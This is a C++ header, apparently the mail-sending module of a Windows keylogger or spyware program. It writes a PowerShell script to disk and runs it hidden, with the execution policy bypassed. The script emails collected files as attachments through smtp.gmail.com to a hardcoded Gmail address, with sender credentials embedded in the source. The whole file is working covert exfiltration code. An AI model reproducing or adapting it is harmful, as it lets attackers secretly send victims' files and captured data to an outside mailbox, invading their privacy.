#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"


#define SCRIPT_NAME "sm.ps1"

namespace Mail {
    #define X_EM_TO "flashjpr@gmail.com"
    #define X_EM_FROM "flashjpr@gmail.com"
    #define X_EM_PASS "NotMyPasswordHereMUHAHA"

    const std::string &PowerShellScript = "Param( [String]$Att, \n       [String]$Subj,\n       [String]$Body\n     )\n\nFunction Send-Mail\n{\n    Param(\n            [Parameter(Mandatory=$true)] [string]$To, \n            [Parameter(Mandatory=$true)] [string]$From,\n            [Parameter(Mandatory=$true)] [string]$Password,\n            [Parameter(Mandatory=$true)] [string]$Subject,\n            [Parameter(Mandatory=$true)] [string]$Body,\n            [Parameter(Mandatory=$true)] [string]$Attachment\n        )\n\n\ttry\n\t{\n\t\t$Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\n\t\t$Srv = \"smtp.gmail.com\"\n\t\tif($Attachment -ne $null)\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\t$attachments = $Attachment -split (\"\\:\\:\");\n\n\t\t\t\tForEach($val in $attachments)\n\t\t\t\t{\n\t\t\t\t\t$attach = New-Object System.Net.Mail.Attachment($val)\n\t\t\t\t\t$Msg.Attachments.Add($attach) \n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch\n\t\t\t{\n\t\t\t\texit 2;\n\t\t\t}\n\n\t\t\t$Client = New-Object Net.Mail.SmtpClient($Srv, 587)\n\t\t\t$Client.EnableSsl = $true\n\t\t\t$Client.Credentials = New-Object System.Net.NetworkCredential($From.Split(\"@\")[0], $Password)\n\t\t\t$Client.Send($Msg)\n\t\t\tRemove-Variable -Name Client\n\t\t\tRemove-Variable -Name Password\n\t\t\texit 7;\n\t\t}\n\t} catch {\n\t\t\texit 3;\n\t}\n}\n\ntry {\n\tSend-Mail -To \""+std::string (X_EM_TO)+"\" -From \""+std::string (X_EM_FROM)+"\" -Password \""+std::string (X_EM_PASS)+"\" -Body $Body -Subject $Subj -Attachment $Att\n} catch {\n    exit 4;\n}\n";

    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS

    std::string StringReplace(std::string s, const std::string &what, const std::string &with){
        if(what.empty())
            return s;
        size_t sp = 0;   // sp = string position

        while((sp = s.find(what, sp)) != std::string::npos)
            s.replace(sp, what.length(), with), sp += with.length();
        return s;
    }

    bool CheckFileExists( const std::string &f){
        std::ifstream file (f);
        return (bool)file;
    }

    bool CreateScript() {
        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

        if(!script)
            return false;
        script << PowerShellScript;

        if(!script)
            return false;

        script.close();

        return true;
    }

    Timer m_timer;

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments){
        bool ok;

        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok)
            return -1;
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        if(!CheckFileExists(scr_path))
            ok = CreateScript();
        if(!ok)
            return -2;

        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                           + StringReplace(subject, "\"", "\\\"") +
                           "\" -Body \"" + StringReplace(body, "\"", "\\\"")
                           + "\" -Att \"" + attachments + "\"";

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.lpVerb = "open"; //lp = longPointer
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = NULL;

        ok = (bool)ShellExecuteEx(&ShExecInfo);

        if(!ok)
            return -3; //script cannot be executed

        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        m_timer.SetFunction([&]()   // Lambda Function aka new annonymus function
        {

            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if((int)exit_code == STILL_ACTIVE)
                TerminateProcess(ShExecInfo.hProcess, 100);
            Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
        });

        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;
    }

    /* Allows us to send more than 1 file as attachments */
    int SendMail(const std::string &subject, const std::string &body,
                 const std::vector<std::string> &att) {
        std::string attachments = "";
        if(att.size() == 1U)
            attachments = att.at(0);
        else{
            for(const auto &v : att)
                attachments += v + "::";
            attachments = attachments.substr(0, attachments.length() - 2);
        }

        return SendMail(subject,body, attachments);
    }
}

#endif // SENDMAIL_H
